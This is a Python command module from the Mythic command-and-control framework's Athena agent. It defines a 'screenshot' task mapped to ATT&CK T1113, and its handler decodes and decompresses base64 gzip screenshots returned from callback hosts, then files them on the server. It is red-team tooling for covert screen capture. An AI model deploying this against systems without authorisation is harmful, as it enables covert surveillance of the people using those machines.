from mythic_container.MythicCommandBase import *
import zlib
from .athena_utils import message_converter
import json
from mythic_container.MythicRPC import *
import base64
from datetime import datetime

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="interval",
                type=ParameterType.Number,
                description="Interval between screenshots in seconds (default 5).",
                #default_value=0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                    ),
                ]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("interval", self.command_line.split()[0])
        else:
            raise ValueError("Missing arguments")


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Tasks Athena to take a screenshot and returns as base64."
    version = 1
    supported_ui_features = []
    is_exit = False
    author = "@tr41nwr3ck"
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    attributes = CommandAttributes(
        load_only=False,
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            screenshot_bytes = await self.decompressGzip(base64.b64decode(user_output))
            date = datetime.today().strftime('%m-%d-%Y')
            time = datetime.today().strftime('%H:%M:%S')
            file_name = "{}_{}_screenshot.png".format(task.Callback.Host, datetime.today().strftime('%Y-%m-%d'))
            fileCreate = MythicRPCFileCreateMessage(task.Task.ID, DeleteAfterFetch = False, FileContents = screenshot_bytes, Filename = file_name, IsScreenshot = True, IsDownloadFromAgent = True, Comment = "Screenshot from {} on {} at {}".format(task.Callback.Host, date, time))
            screenshotFile = await SendMythicRPCFileCreate(fileCreate)
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
    
    
    async def decompressGzip(self, data):
        return zlib.decompress(data, zlib.MAX_WBITS|32)
